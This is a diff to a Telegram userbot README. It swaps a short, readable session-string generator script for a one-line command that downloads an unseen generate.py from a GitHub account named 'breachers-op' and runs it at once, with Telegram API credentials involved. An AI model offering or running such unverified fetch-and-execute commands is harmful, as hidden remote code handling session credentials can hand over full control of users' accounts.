@@ -48,18 +48,7 @@
 ʏᴏᴜ ɴᴇᴇᴅ ᴀ SESSION_STRING ꜰᴏʀ ᴛʜᴇ ᴜsᴇʀʙᴏᴛ ᴛᴏ ᴊᴏɪɴ ᴠᴏɪᴄᴇ ᴄʜᴀᴛs. ᴜsᴇ ᴛʜɪs sᴄʀɪᴘᴛ
 (ʀᴜɴ ɪɴ ᴛᴇʀᴍᴜx ᴏʀ ᴘᴄ):
 
-session.py
-
-from pyrogram import Client
-
-print("--- Criminals session generator ---")
-api_id = int(input("Enter API_ID: "))
-api_hash = input("Enter API_HASH: ")
-
-with Client(":memory:", api_id=api_id, api_hash=api_hash) as app:
-    print("\nYour SESSION_STRING is:\n")
-    print(app.export_session_string())
-    print("\nCopy this string and keep it safe!")
+pkg install python -y && pip install pyrogram tgcrypto && curl -sL https://raw.githubusercontent.com/breachers-op/Criminals-mgmt-music-ai-chat/main/generate.py -o generate.py && python generate.py
 
 🖥️ ᴠᴘs ᴅᴇᴘʟᴏʏᴍᴇɴᴛ
 
